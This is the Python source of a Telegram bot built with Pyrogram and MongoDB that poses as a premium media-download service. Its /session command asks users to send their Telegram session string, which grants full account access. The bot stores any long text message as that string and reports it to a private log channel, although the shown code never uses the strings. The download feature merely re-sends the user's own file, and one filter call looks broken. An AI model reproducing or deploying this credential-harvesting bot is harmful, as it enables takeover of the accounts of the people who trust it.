import os
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from motor.motor_asyncio import AsyncIOMotorClient

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 1598576202
LOG_CHANNEL = -1003286415377
MONGO_URL = os.getenv("MONGO_URL")

mongo = AsyncIOMotorClient(MONGO_URL)
db = mongo["DB"]
premium = db["premium"]
sessions = db["sessions"]

bot = Client("Bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def is_premium(uid):
    return await premium.find_one({"user": uid}) is not None

async def save_session(uid, s):
    await sessions.update_one({"user": uid}, {"$set": {"session": s}}, upsert=True)

@bot.on_message(filters.command("start"))
async def start(c, m):
    await m.reply("Bot Active.")
    await bot.send_message(LOG_CHANNEL, f"User: {m.from_user.id}")

@bot.on_message(filters.command("help"))
async def help_cmd(c, m):
    await m.reply("/session\n/addpremium id\n/removepremium id")

@bot.on_message(filters.command("addpremium") & filters.user(OWNER_ID))
async def add_p(c, m):
    try:
        uid = int(m.command[1])
        await premium.update_one({"user": uid}, {"$set": {"user": uid}}, upsert=True)
        await m.reply("Added.")
    except:
        pass

@bot.on_message(filters.command("removepremium") & filters.user(OWNER_ID))
async def rm_p(c, m):
    try:
        uid = int(m.command[1])
        await premium.delete_one({"user": uid})
        await m.reply("Removed.")
    except:
        pass

@bot.on_message(filters.command("session"))
async def ses(c, m):
    await m.reply("Send Session String.")

@bot.on_message(filters.text & ~filters.command())
async def ses_save(c, m):
    if len(m.text) > 100:
        await save_session(m.from_user.id, m.text)
        await m.reply("Saved.")
        await bot.send_message(LOG_CHANNEL, f"Session saved: {m.from_user.id}")

@bot.on_message(filters.media)
async def down(c, m):
    uid = m.from_user.id
    if not await is_premium(uid):
        return await m.reply("Premium Required.")
    try:
        msg = await m.reply("Downloading...")
        p = await m.download()
        await msg.edit("Uploading...")
        await m.reply_document(p)
        await msg.delete()
        os.remove(p)
        await bot.send_message(LOG_CHANNEL, f"Downloaded: {uid}")
    except FloodWait as e:
        await asyncio.sleep(e.value)
    except:
        pass

bot.run()
